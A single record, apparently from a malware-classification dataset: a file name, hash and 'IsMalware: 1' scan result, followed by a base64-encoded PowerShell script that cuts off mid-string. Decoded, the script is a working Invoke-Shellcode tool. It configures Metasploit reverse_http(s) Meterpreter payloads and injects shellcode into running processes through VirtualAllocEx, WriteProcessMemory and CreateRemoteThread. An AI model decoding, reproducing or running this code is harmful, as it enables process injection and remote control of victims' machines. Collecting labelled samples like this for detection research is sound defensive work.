connect.ps1,b990ecd21f5f82f358cb7605daa80d67,Scan result is 32768. IsMalware: 1,ZnVuY3Rpb24gSW52b2tlLVNoZWxsY29kZQp7CgpbQ21kbGV0QmluZGluZyggRGVmYXVsdFBhcmFtZXRlclNldE5hbWUgPSAnUnVuTG9jYWwnLCBTdXBwb3J0c1Nob3VsZFByb2Nlc3MgPSAkVHJ1ZSAsIENvbmZpcm1JbXBhY3QgPSAnSGlnaCcpXSBQYXJhbSAoCiAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgW1VJbnQxNl0KICAgICRQcm9jZXNzSUQsCiAgICAKICAgIFtQYXJhbWV0ZXIoIFBhcmFtZXRlclNldE5hbWUgPSAnUnVuTG9jYWwnICldCiAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgW0J5dGVbXV0KICAgICRTaGVsbGNvZGUsCiAgICAKICAgIFtQYXJhbWV0ZXIoIFBhcmFtZXRlclNldE5hbWUgPSAnTWV0YXNwbG9pdCcgKV0KICAgIFtWYWxpZGF0ZVNldCggJ3dpbmRvd3MvbWV0ZXJwcmV0ZXIvcmV2ZXJzZV9odHRwJywKICAgICAgICAgICAgICAgICAgJ3dpbmRvd3MvbWV0ZXJwcmV0ZXIvcmV2ZXJzZV9odHRwcycsCiAgICAgICAgICAgICAgICAgIElnbm9yZUNhc2UgPSAkVHJ1ZSApXQogICAgW1N0cmluZ10KICAgICRQYXlsb2FkID0gJ3dpbmRvd3MvbWV0ZXJwcmV0ZXIvcmV2ZXJzZV9odHRwJywKICAgIAogICAgW1BhcmFtZXRlciggUGFyYW1ldGVyU2V0TmFtZSA9ICdMaXN0UGF5bG9hZHMnICldCiAgICBbU3dpdGNoXQogICAgJExpc3RNZXRhc3Bsb2l0UGF5bG9hZHMsCiAgICAKICAgIFtQYXJhbWV0ZXIoIE1hbmRhdG9yeSA9ICRUcnVlLAogICAgICAgICAgICAgICAgUGFyYW1ldGVyU2V0TmFtZSA9ICdNZXRhc3Bsb2l0JyApXQogICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgIFtTdHJpbmddCiAgICAkTGhvc3QgPSAnMTI3LjAuMC4xJywKICAgIAogICAgW1BhcmFtZXRlciggTWFuZGF0b3J5ID0gJFRydWUsCiAgICAgICAgICAgICAgICBQYXJhbWV0ZXJTZXROYW1lID0gJ01ldGFzcGxvaXQnICldCiAgICBbVmFsaWRhdGVSYW5nZSggMSw2NTUzNSApXQogICAgW0ludF0KICAgICRMcG9ydCA9IDg0NDMsCiAgICAKICAgIFtQYXJhbWV0ZXIoIFBhcmFtZXRlclNldE5hbWUgPSAnTWV0YXNwbG9pdCcgKV0KICAgIFtWYWxpZGF0ZU5vdE51bGwoKV0KICAgIFtTdHJpbmddCiAgICAkVXNlckFnZW50ID0gJ01vemlsbGEvNS4wIChjb21wYXRpYmxlOyBNU0lFIDkuMDsgV2luZG93cyBOVCA2LjE7IFRyaWRlbnQvNS4wKScsCiAgICAKICAgIFtTd2l0Y2hdCiAgICAkRm9yY2UgPSAkRmFsc2UKKQoKICAgIFNldC1TdHJpY3RNb2RlIC1WZXJzaW9uIDIuMAogICAgCiAgICAjIExpc3QgYWxsIGF2YWlsYWJsZSBNZXRhc3Bsb2l0IHBheWxvYWRzIGFuZCBleGl0IHRoZSBmdW5jdGlvbgogICAgaWYgKCRQc0NtZGxldC5QYXJhbWV0ZXJTZXROYW1lIC1lcSAnTGlzdFBheWxvYWRzJykKICAgIHsKICAgICAgICAkQXZhaWxhYmxlUGF5bG9hZHMgPSAoR2V0LUNvbW1hbmQgSW52b2tlLVNoZWxsY29kZSkuUGFyYW1ldGVyc1snUGF5bG9hZCddLkF0dHJpYnV0ZXMgfAogICAgICAgICAgICBXaGVyZS1PYmplY3QgeyRfLlR5cGVJZCAtZXEgW1N5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uVmFsaWRhdGVTZXRBdHRyaWJ1dGVdfQogICAgCiAgICAgICAgZm9yZWFjaCAoJFBheWxvYWQgaW4gJEF2YWlsYWJsZVBheWxvYWRzLlZhbGlkVmFsdWVzKQogICAgICAgIHsKICAgICAgICAgICAgTmV3LU9iamVjdCBQU09iamVjdCAtUHJvcGVydHkgQHsgUGF5bG9hZHMgPSAkUGF5bG9hZCB9CiAgICAgICAgfQogICAgICAgIAogICAgICAgIFJldHVybgogICAgfQoKICAgIGlmICggJFBTQm91bmRQYXJhbWV0ZXJzWydQcm9jZXNzSUQnXSApCiAgICB7CiAgICAgICAgIyBFbnN1cmUgYSB2YWxpZCBwcm9jZXNzIElEIHdhcyBwcm92aWRlZAogICAgICAgICMgVGhpcyBjb3VsZCBoYXZlIGJlZW4gdmFsaWRhdGVkIHZpYSAnVmFsaWRhdGVTY3JpcHQnIGJ1dCB0aGUgZXJyb3IgZ2VuZXJhdGVkIHdpdGggR2V0LVByb2Nlc3MgaXMgbW9yZSBkZXNjcmlwdGl2ZQogICAgICAgIEdldC1Qcm9jZXNzIC1JZCAkUHJvY2Vzc0lEIC1FcnJvckFjdGlvbiBTdG9wIHwgT3V0LU51bGwKICAgIH0KICAgIAogICAgZnVuY3Rpb24gTG9jYWw6R2V0LURlbGVnYXRlVHlwZQogICAgewogICAgICAgIFBhcmFtCiAgICAgICAgKAogICAgICAgICAgICBbT3V0cHV0VHlwZShbVHlwZV0pXQogICAgICAgICAgICAKICAgICAgICAgICAgW1BhcmFtZXRlciggUG9zaXRpb24gPSAwKV0KICAgICAgICAgICAgW1R5cGVbXV0KICAgICAgICAgICAgJFBhcmFtZXRlcnMgPSAoTmV3LU9iamVjdCBUeXBlW10oMCkpLAogICAgICAgICAgICAKICAgICAgICAgICAgW1BhcmFtZXRlciggUG9zaXRpb24gPSAxICldCiAgICAgICAgICAgIFtUeXBlXQogICAgICAgICAgICAkUmV0dXJuVHlwZSA9IFtWb2lkXQogICAgICAgICkKCiAgICAgICAgJERvbWFpbiA9IFtBcHBEb21haW5dOjpDdXJyZW50RG9tYWluCiAgICAgICAgJER5bkFzc2VtYmx5ID0gTmV3LU9iamVjdCBTeXN0ZW0uUmVmbGVjdGlvbi5Bc3NlbWJseU5hbWUoJ1JlZmxlY3RlZERlbGVnYXRlJykKICAgICAgICAkQXNzZW1ibHlCdWlsZGVyID0gJERvbWFpbi5EZWZpbmVEeW5hbWljQXNzZW1ibHkoJER5bkFzc2VtYmx5LCBbU3lzdGVtLlJlZmxlY3Rpb24uRW1pdC5Bc3NlbWJseUJ1aWxkZXJBY2Nlc3NdOjpSdW4pCiAgICAgICAgJE1vZHVsZUJ1aWxkZXIgPSAkQXNzZW1ibHlCdWlsZGVyLkRlZmluZUR5bmFtaWNNb2R1bGUoJ0luTWVtb3J5TW9kdWxlJywgJGZhbHNlKQogICAgICAgICRUeXBlQnVpbGRlciA9ICRNb2R1bGVCdWlsZGVyLkRlZmluZVR5cGUoJ015RGVsZWdhdGVUeXBlJywgJ0NsYXNzLCBQdWJsaWMsIFNlYWxlZCwgQW5zaUNsYXNzLCBBdXRvQ2xhc3MnLCBbU3lzdGVtLk11bHRpY2FzdERlbGVnYXRlXSkKICAgICAgICAkQ29uc3RydWN0b3JCdWlsZGVyID0gJFR5cGVCdWlsZGVyLkRlZmluZUNvbnN0cnVjdG9yKCdSVFNwZWNpYWxOYW1lLCBIaWRlQnlTaWcsIFB1YmxpYycsIFtTeXN0ZW0uUmVmbGVjdGlvbi5DYWxsaW5nQ29udmVudGlvbnNdOjpTdGFuZGFyZCwgJFBhcmFtZXRlcnMpCiAgICAgICAgJENvbnN0cnVjdG9yQnVpbGRlci5TZXRJbXBsZW1lbnRhdGlvbkZsYWdzKCdSdW50aW1lLCBNYW5hZ2VkJykKICAgICAgICAkTWV0aG9kQnVpbGRlciA9ICRUeXBlQnVpbGRlci5EZWZpbmVNZXRob2QoJ0ludm9rZScsICdQdWJsaWMsIEhpZGVCeVNpZywgTmV3U2xvdCwgVmlydHVhbCcsICRSZXR1cm5UeXBlLCAkUGFyYW1ldGVycykKICAgICAgICAkTWV0aG9kQnVpbGRlci5TZXRJbXBsZW1lbnRhdGlvbkZsYWdzKCdSdW50aW1lLCBNYW5hZ2VkJykKICAgICAgICAKICAgICAgICBXcml0ZS1PdXRwdXQgJFR5cGVCdWlsZGVyLkNyZWF0ZVR5cGUoKQogICAgfQoKICAgIGZ1bmN0aW9uIExvY2FsOkdldC1Qcm9jQWRkcmVzcwogICAgewogICAgICAgIFBhcmFtCiAgICAgICAgKAogICAgICAgICAgICBbT3V0cHV0VHlwZShbSW50UHRyXSldCiAgICAgICAgCiAgICAgICAgICAgIFtQYXJhbWV0ZXIoIFBvc2l0aW9uID0gMCwgTWFuZGF0b3J5ID0gJFRydWUgKV0KICAgICAgICAgICAgW1N0cmluZ10KICAgICAgICAgICAgJE1vZHVsZSwKICAgICAgICAgICAgCiAgICAgICAgICAgIFtQYXJhbWV0ZXIoIFBvc2l0aW9uID0gMSwgTWFuZGF0b3J5ID0gJFRydWUgKV0KICAgICAgICAgICAgW1N0cmluZ10KICAgICAgICAgICAgJFByb2NlZHVyZQogICAgICAgICkKCiAgICAgICAgIyBHZXQgYSByZWZlcmVuY2UgdG8gU3lzdGVtLmRsbCBpbiB0aGUgR0FDCiAgICAgICAgJFN5c3RlbUFzc2VtYmx5ID0gW0FwcERvbWFpbl06OkN1cnJlbnREb21haW4uR2V0QXNzZW1ibGllcygpIHwKICAgICAgICAgICAgV2hlcmUtT2JqZWN0IHsgJF8uR2xvYmFsQXNzZW1ibHlDYWNoZSAtQW5kICRfLkxvY2F0aW9uLlNwbGl0KCdcXCcpWy0xXS5FcXVhbHMoJ1N5c3RlbS5kbGwnKSB9CiAgICAgICAgJFVuc2FmZU5hdGl2ZU1ldGhvZHMgPSAkU3lzdGVtQXNzZW1ibHkuR2V0VHlwZSgnTWljcm9zb2Z0LldpbjMyLlVuc2FmZU5hdGl2ZU1ldGhvZHMnKQogICAgICAgICMgR2V0IGEgcmVmZXJlbmNlIHRvIHRoZSBHZXRNb2R1bGVIYW5kbGUgYW5kIEdldFByb2NBZGRyZXNzIG1ldGhvZHMKICAgICAgICAkR2V0TW9kdWxlSGFuZGxlID0gJFVuc2FmZU5hdGl2ZU1ldGhvZHMuR2V0TWV0aG9kKCdHZXRNb2R1bGVIYW5kbGUnKQogICAgICAgICRHZXRQcm9jQWRkcmVzcyA9ICRVbnNhZmVOYXRpdmVNZXRob2RzLkdldE1ldGhvZCgnR2V0UHJvY0FkZHJlc3MnKQogICAgICAgICMgR2V0IGEgaGFuZGxlIHRvIHRoZSBtb2R1bGUgc3BlY2lmaWVkCiAgICAgICAgJEtlcm4zMkhhbmRsZSA9ICRHZXRNb2R1bGVIYW5kbGUuSW52b2tlKCRudWxsLCBAKCRNb2R1bGUpKQogICAgICAgICR0bXBQdHIgPSBOZXctT2JqZWN0IEludFB0cgogICAgICAgICRIYW5kbGVSZWYgPSBOZXctT2JqZWN0IFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5IYW5kbGVSZWYoJHRtcFB0ciwgJEtlcm4zMkhhbmRsZSkKICAgICAgICAKICAgICAgICAjIFJldHVybiB0aGUgYWRkcmVzcyBvZiB0aGUgZnVuY3Rpb24KICAgICAgICBXcml0ZS1PdXRwdXQgJEdldFByb2NBZGRyZXNzLkludm9rZSgkbnVsbCwgQChbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLkhhbmRsZVJlZl0kSGFuZGxlUmVmLCAkUHJvY2VkdXJlKSkKICAgIH0KCiAgICAjIEVtaXRzIGEgc2hlbGxjb2RlIHN0dWIgdGhhdCB3aGVuIGluamVjdGVkIHdpbGwgY3JlYXRlIGEgdGhyZWFkIGFuZCBwYXNzIGV4ZWN1dGlvbiB0byB0aGUgbWFpbiBzaGVsbGNvZGUgcGF5bG9hZAogICAgZnVuY3Rpb24gTG9jYWw6RW1pdC1DYWxsVGhyZWFkU3R1YiAoW0ludFB0cl0gJEJhc2VBZGRyLCBbSW50UHRyXSAkRXhpdFRocmVhZEFkZHIsIFtJbnRdICRBcmNoaXRlY3R1cmUpCiAgICB7CiAgICAgICAgJEludFNpemVQdHIgPSAkQXJjaGl0ZWN0dXJlIC8gOAoKICAgICAgICBmdW5jdGlvbiBMb2NhbDpDb252ZXJ0VG8tTGl0dGxlRW5kaWFuIChbSW50UHRyXSAkQWRkcmVzcykKICAgICAgICB7CiAgICAgICAgICAgICRMaXR0bGVFbmRpYW5CeXRlQXJyYXkgPSBOZXctT2JqZWN0IEJ5dGVbXSgwKQogICAgICAgICAgICAkQWRkcmVzcy5Ub1N0cmluZygiWCQoJEludFNpemVQdHIqMikiKSAtc3BsaXQgJyhbQS1GMC05XXsyfSknIHwgRm9yRWFjaC1PYmplY3QgeyBpZiAoJF8pIHsgJExpdHRsZUVuZGlhbkJ5dGVBcnJheSArPSBbQnl0ZV0gKCcweHswfScgLWYgJF8pIH0gfQogICAgICAgICAgICBbU3lzdGVtLkFycmF5XTo6UmV2ZXJzZSgkTGl0dGxlRW5kaWFuQnl0ZUFycmF5KQogICAgICAgICAgICAKICAgICAgICAgICAgV3JpdGUtT3V0cHV0ICRMaXR0bGVFbmRpYW5CeXRlQXJyYXkKICAgICAgICB9CiAgICAgICAgCiAgICAgICAgJENhbGxTdHViID0gTmV3LU9iamVjdCBCeXRlW10oMCkKICAgICAgICAKICAgICAgICBpZiAoJEludFNpemVQdHIgLWVxIDgpCiAgICAgICAgewogICAgICAgICAgICBbQnl0ZVtdXSAkQ2FsbFN0dWIgPSAweDQ4LDB4QjggICAgICAgICAgICAgICAgICAgICAgIyBNT1YgICBRV09SRCBSQVgsICZzaGVsbGNvZGUKICAgICAgICAgICAgJENhbGxTdHViICs9IENvbnZlcnRUby1MaXR0bGVFbmRpYW4gJEJhc2VBZGRyICAgICAgICMgJnNoZWxsY29kZQogICAgICAgICAgICAkQ2FsbFN0dWIgKz0gMHhGRiwweEQwICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIyBDQUxMICBSQVgKICAgICAgICAgICAgJENhbGxTdHViICs9IDB4NkEsMHgwMCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICMgUFVTSCAgQllURSAwCiAgICAgICAgICAgICRDYWxsU3R1YiArPSAweDQ4LDB4QjggICAgICAgICAgICAgICAgICAgICAgICAgICAgICAjIE1PViAgIFFXT1JEIFJBWCwgJkV4aXRUaHJlYWQKICAgICAgICAgICAgJENhbGxTdHViICs9IENvbnZlcnRUby1MaXR0bGVFbmRpYW4gJEV4aXRUaHJlYWRBZGRyICMgJkV4aXRUaHJlYWQKICAgICAgICAgICAgJENhbGxTdHViICs9IDB4RkYsMHhEMCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICMgQ0FMTCAgUkFYCiAgICAgICAgfQogICAgICAgIGVsc2UKICAgICAgICB7CiAgICAgICAgICAgIFtCeXRlW11dICRDYWxsU3R1YiA9IDB4QjggICAgICAgICAgICAgICAgICAgICAgICAgICAjIE1PViAgIERXT1JEIEVBWCwgJnNoZWxsY29kZQogICAgICAgICAgICAkQ2FsbFN0dWIgKz0gQ29udmVydFRvLUxpdHRsZUVuZGlhbiAkQmFzZUFkZHIgICAgICAgIyAmc2hlbGxjb2RlCiAgICAgICAgICAgICRDYWxsU3R1YiArPSAweEZGLDB4RDAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAjIENBTEwgIEVBWAogICAgICAgICAgICAkQ2FsbFN0dWIgKz0gMHg2QSwweDAwICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIyBQVVNIICBCWVRFIDAKICAgICAgICAgICAgJENhbGxTdHViICs9IDB4QjggICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICMgTU9WICAgRFdPUkQgRUFYLCAmRXhpdFRocmVhZAogICAgICAgICAgICAkQ2FsbFN0dWIgKz0gQ29udmVydFRvLUxpdHRsZUVuZGlhbiAkRXhpdFRocmVhZEFkZHIgIyAmRXhpdFRocmVhZAogICAgICAgICAgICAkQ2FsbFN0dWIgKz0gMHhGRiwweEQwICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIyBDQUxMICBFQVgKICAgICAgICB9CiAgICAgICAgCiAgICAgICAgV3JpdGUtT3V0cHV0ICRDYWxsU3R1YgogICAgfQoKICAgIGZ1bmN0aW9uIExvY2FsOkluamVjdC1SZW1vdGVTaGVsbGNvZGUgKFtJbnRdICRQcm9jZXNzSUQpCiAgICB7CiAgICAgICAgIyBPcGVuIGEgaGFuZGxlIHRvIHRoZSBwcm9jZXNzIHlvdSB3YW50IHRvIGluamVjdCBpbnRvCiAgICAgICAgJGhQcm9jZXNzID0gJE9wZW5Qcm9jZXNzLkludm9rZSgweDAwMUYwRkZGLCAkZmFsc2UsICRQcm9jZXNzSUQpICMgUHJvY2Vzc0FjY2Vzc0ZsYWdzLkFsbCAoMHgwMDFGMEZGRikKICAgICAgICAKICAgICAgICBpZiAoISRoUHJvY2VzcykKICAgICAgICB7CiAgICAgICAgICAgIFRocm93ICJVbmFibGUgdG8gb3BlbiBhIHByb2Nlc3MgaGFuZGxlIGZvciBQSUQ6ICRQcm9jZXNzSUQiCiAgICAgICAgfQoKICAgICAgICAkSXNXb3c2NCA9ICRmYWxzZQoKICAgICAgICBpZiAoJDY0Yml0Q1BVKSAjIE9ubHkgcGVyZm9ybSB0aGVzZXMgY2hlY2tzIGlmIENQVSBpcyA2NC1iaXQKICAgICAgICB7CiAgICAgICAgICAgICMgRGV0ZXJtaW5lIGlzIHRoZSBwcm9jZXNzIHNwZWNpZmllZCBpcyAzMiBvciA2NCBiaXQKICAgICAgICAgICAgJElzV293NjRQcm9jZXNzLkludm9rZSgkaFByb2Nlc3MsIFtSZWZdICRJc1dvdzY0KSB8IE91dC1OdWxsCiAgICAgICAgICAgIAogICAgICAgICAgICBpZiAoKCEkSXNXb3c2NCkgLWFuZCAkUG93ZXJTaGVsbDMyYml0KQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBUaHJvdyAnVW5hYmxlIHRvIGluamVjdCA2NC1iaXQgc2hlbGxjb2RlIGZyb20gd2l0aGluIDMyLWJpdCBQb3dlcnNoZWxsLiBVc2UgdGhlIDY0LWJpdCB2ZXJzaW9uIG9mIFBvd2Vyc2hlbGwgaWYgeW91IHdhbnQgdGhpcyB0byB3b3JrLicKICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlaWYgKCRJc1dvdzY0KSAjIDMyLWJpdCBXb3c2NCBwcm9jZXNzCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIGlmICgkU2hlbGxjb2RlMzIuTGVuZ3RoIC1lcSAwKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIFRocm93ICdObyBzaGVsbGNvZGUgd2FzIHBsYWNlZCBpbiB0aGUgJFNoZWxsY29kZTMyIHZhcmlhYmxlIScKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgJFNoZWxsY29kZSA9ICRTaGVsbGNvZGUzMgogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAnSW5qZWN0aW5nIGludG8gYSBXb3c2NCBwcm9jZXNzLicKICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgJ1VzaW5nIDMyLWJpdCBzaGVsbGNvZGUuJwogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UgIyA2NC1iaXQgcHJvY2VzcwogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBpZiAoJFNoZWxsY29kZTY0Lkxlbmd0aCAtZXEgMCkKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICBUaHJvdyAnTm8gc2hlbGxjb2RlIHdhcyBwbGFjZWQgaW4gdGhlICRTaGVsbGNvZGU2NCB2YXJpYWJsZSEnCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICRTaGVsbGNvZGUgPSAkU2hlbGxjb2RlNjQKICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgJ1VzaW5nIDY0LWJpdCBzaGVsbGNvZGUuJwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGVsc2UgIyAzMi1iaXQgQ1BVCiAgICAgICAgewogICAgICAgICAgICBpZiAoJFNoZWxsY29kZTMyLkxlbmd0aCAtZXEgMCkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgVGhyb3cgJ05vIHNoZWxsY29kZSB3YXMgcGxhY2VkIGluIHRoZSAkU2hlbGxjb2RlMzIgdmFyaWFibGUhJwogICAgICAgICAgICB9CiAgICAgICAgICAgIAogICAgICAgICAgICAkU2hlbGxjb2RlID0gJFNoZWxsY29kZTMyCiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgJ1VzaW5nIDMyLWJpdCBzaGVsbGNvZGUuJwogICAgICAgIH0KCiAgICAgICAgIyBSZXNlcnZlIGFuZCBjb21taXQgZW5vdWdoIG1lbW9yeSBpbiByZW1vdGUgcHJvY2VzcyB0byBob2xkIHRoZSBzaGVsbGNvZGUKICAgICAgICAkUmVtb3RlTWVtQWRkciA9ICRWaXJ0dWFsQWxsb2NFeC5JbnZva2UoJGhQcm9jZXNzLCBbSW50UHRyXTo6WmVybywgJFNoZWxsY29kZS5MZW5ndGggKyAxLCAweDMwMDAsIDB4NDApICMgKFJlc2VydmV8Q29tbWl0LCBSV1gpCiAgICAgICAgCiAgICAgICAgaWYgKCEkUmVtb3RlTWVtQWRkcikKICAgICAgICB7CiAgICAgICAgICAgIFRocm93ICJVbmFibGUgdG8gYWxsb2NhdGUgc2hlbGxjb2RlIG1lbW9yeSBpbiBQSUQ6ICRQcm9jZXNzSUQiCiAgICAgICAgfQogICAgICAgIAogICAgICAgIFdyaXRlLVZlcmJvc2UgIlNoZWxsY29kZSBtZW1vcnkgcmVzZXJ2ZWQgYXQgMHgkKCRSZW1vdGVNZW1BZGRyLlRvU3RyaW5nKCJYJChbSW50UHRyXTo6U2l6ZSoyKSIpKSIKCiAgICAgICAgIyBDb3B5IHNoZWxsY29kZSBpbnRvIHRoZSBwcmV2aW91c2x5IGFsbG9jYXRlZCBtZW1vcnkKICAgICAgICAkV3JpdGVQcm9jZXNzTWVtb3J5Lkludm9rZSgkaFByb2Nlc3MsICRSZW1vdGVNZW1BZGRyLCAkU2hlbGxjb2RlLCAkU2hlbGxjb2RlLkxlbmd0aCwgW1JlZl0gMCkgfCBPdXQtTnVsbAoKICAgICAgICAjIEdldCBhZGRyZXNzIG9mIEV4aXRUaHJlYWQgZnVuY3Rpb24KICAgICAgICAkRXhpdFRocmVhZEFkZHIgPSBHZXQtUHJvY0FkZHJlc3Mga2VybmVsMzIuZGxsIEV4aXRUaHJlYWQKCiAgICAgICAgaWYgKCRJc1dvdzY0KQogICAgICAgIHsKICAgICAgICAgICAgIyBCdWlsZCAzMi1iaXQgaW5saW5lIGFzc2VtYmx5IHN0dWIgdG8gY2FsbCB0aGUgc2hlbGxjb2RlIHVwb24gY3JlYXRpb24gb2YgYSByZW1vdGUgdGhyZWFkLgogICAgICAgICAgICAkQ2FsbFN0dWIgPSBFbWl0LUNhbGxUaHJlYWRTdHViICRSZW1vdGVNZW1BZGRyICRFeGl0VGhyZWFkQWRkciAzMgogICAgICAgICAgICAKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAnRW1pdHRpbmcgMzItYml0IGFzc2VtYmx5IGNhbGwgc3R1Yi4nCiAgICAgICAgfQogICAgICAgIGVsc2UKICAgICAgICB7CiAgICAgICAgICAgICMgQnVpbGQgNjQtYml0IGlubGluZSBhc3NlbWJseSBzdHViIHRvIGNhbGwgdGhlIHNoZWxsY29kZSB1cG9uIGNyZWF0aW9uIG9mIGEgcmVtb3RlIHRocmVhZC4KICAgICAgICAgICAgJENhbGxTdHViID0gRW1pdC1DYWxsVGhyZWFkU3R1YiAkUmVtb3RlTWVtQWRkciAkRXhpdFRocmVhZEFkZHIgNjQKICAgICAgICAgICAgCiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgJ0VtaXR0aW5nIDY0LWJpdCBhc3NlbWJseSBjYWxsIHN0dWIuJwogICAgICAgIH0KCiAgICAgICAgIyBBbGxvY2F0ZSBpbmxpbmUgYXNzZW1ibHkgc3R1YgogICAgICAgICRSZW1vdGVTdHViQWRkciA9ICRWaXJ0dWFsQWxsb2NFeC5JbnZva2UoJGhQcm9jZXNzLCBbSW50UHRyXTo6WmVybywgJENhbGxTdHViLkxlbmd0aCwgMHgzMDAwLCAweDQwKSAjIChSZXNlcnZlfENvbW1pdCwgUldYKQogICAgICAgIAogICAgICAgIGlmICghJFJlbW90ZVN0dWJBZGRyKQogICAgICAgIHsKICAgICAgICAgICAgVGhyb3cgIlVuYWJsZSB0byBhbGxvY2F0ZSB0aHJlYWQgY2FsbCBzdHViIG1lbW9yeSBpbiBQSUQ6ICRQcm9jZXNzSUQiCiAgICAgICAgfQogICAgICAgIAogICAgICAgIFdyaXRlLVZlcmJvc2UgIlRocmVhZCBjYWxsIHN0dWIgbWVtb3J5IHJlc2VydmVkIGF0IDB4JCgkUmVtb3RlU3R1YkFkZHIuVG9TdHJpbmcoIlgkKFtJbnRQdHJdOjpTaXplKjIpIikpIgoKICAgICAgICAjIFdyaXRlIDMyLWJpdCBhc3NlbWJseSBzdHViIHRvIHJlbW90ZSBwcm9jZXNzIG1lbW9yeSBzcGFjZQogICAgICAgICRXcml0ZVByb2Nlc3NNZW1vcnkuSW52b2tlKCRoUHJvY2VzcywgJFJlbW90ZVN0dWJBZGRyLCAkQ2FsbFN0dWIsICRDYWxsU3R1Yi5MZW5ndGgsIFtSZWZdIDApIHwgT3V0LU51bGwKCiAgICAgICAgIyBFeGVjdXRlIHNoZWxsY29kZSBhcyBhIHJlbW90ZSB0aHJlYWQKICAgICAgICAkVGhyZWFkSGFuZGxlID0gJENyZWF0ZVJlbW90ZVRocmVhZC5JbnZva2UoJGhQcm9jZXNzLCBbSW50UHRyXTo6WmVybywgMCwgJFJlbW90ZVN0dWJBZGRyLCAkUmVtb3RlTWVtQWRkciwgMCwgW0ludFB0cl06Olplcm8pCiAgICAgICAgCiAgICAgICAgaWYgKCEkVGhyZWFkSGFuZGxlKQogICAgICAgIHsKICAgICAgICAgICAgVGhyb3cgIlVuYWJsZSB0byBsYXVuY2ggcmVtb3RlIHRocmVhZCBpbiBQSUQ6ICRQcm9jZXNzSUQiCiAgICAgICAgfQoKICAgICAgICAjIENsb3NlIHByb2Nlc3MgaGFuZGxlCiAgICAgICAgJENsb3NlSGFuZGxlLkludm9rZSgkaFByb2Nlc3MpIHwgT3V0LU51bGwKCiAgICAgICAgV3JpdGUtVmVyYm9zZSAnU2hlbGxjb2RlIGluamVjdGlvbiBjb21wbGV0ZSEnCiAgICB9CgogICAgZnVuY3Rpb24gTG9jYWw6SW5qZWN0LUxvY2FsU2hlbGxjb2RlCiAgICB7CiAgICAgICAgaWYgKCRQb3dlclNoZWxsMzJiaXQpIHsKICAgICAgICAgICAgaWYgKCRTaGVsbGNvZGUzMi5MZW5ndGggLWVxIDApCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIFRocm93ICdObyBzaGVsbGNvZGUgd2FzIHBsYWNlZCBpbiB0aGUgJFNoZWxsY29kZTMyIHZhcmlhYmxlIScKICAgICAgICAgICAgICAgIHJldHVybgogICAgICAgICAgICB9CiAgICAgICAgICAgIAogICAgICAgICAgICAkU2hlbGxjb2RlID0gJFNoZWxsY29kZTMyCiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgJ1VzaW5nIDMyLWJpdCBzaGVsbGNvZGUuJwogICAgICAgIH0KICAgICAgICBlbHNlCiAgICAgICAgewogICAgICAgICAgICBpZiAoJFNoZWxsY29kZTY0Lkxlbmd0aCAtZXEgMCkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgVGhyb3cgJ05vIHNoZWxsY29kZSB3YXMgcGxhY2VkIGluIHRoZSAkU2hlbGxjb2RlNjQgdmFyaWFibGUhJwogICAgICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgICAgIH0KICAgICAgICAgICAgCiAgICAgICAgICAgICRTaGVsbGNvZGUgPSAkU2hlbGxjb2RlNjQKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAnVXNpbmcgNjQtYml0IHNoZWxsY29kZS4nCiAgICAgICAgfQogICAgCiAgICAgICAgIyBBbGxvY2F0ZSBSV1ggbWVtb3J5IGZvciB0aGUgc2hlbGxjb2RlCiAgICAgICAgJEJhc2VBZGRyZXNzID0gJFZpcnR1YWxBbGxvYy5JbnZva2UoW0ludFB0cl06Olplcm8sICRTaGVsbGNvZGUuTGVuZ3RoICsgMSwgMHgzMDAwLCAweDQwKSAjIChSZXNlcnZlfENvbW1pdCwgUldYKQogICAgICAgIGlmICghJEJhc2VBZGRyZXNzKQogICAgICAgIHsKICAgICAgICAgICAgVGhyb3cgIlVuYWJsZSB0byBhbGxvY2F0ZSBzaGVsbGNvZGUgbWVtb3J5IGluIFBJRDogJFByb2Nlc3NJRCIKICAgICAgICB9CiAgICAgICAgCiAgICAgICAgV3JpdGUtVmVyYm9zZSAiU2hlbGxjb2RlIG1lbW9yeSByZXNlcnZlZCBhdCAweCQoJEJhc2VBZGRyZXNzLlRvU3RyaW5nKCJYJChbSW50UHRyXTo6U2l6ZSoyKSIpKSIKCiAgICAgICAgIyBDb3B5IHNoZWxsY29kZSB0byBSV1ggYnVmZmVyCiAgICAgICAgW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6Q29weSgkU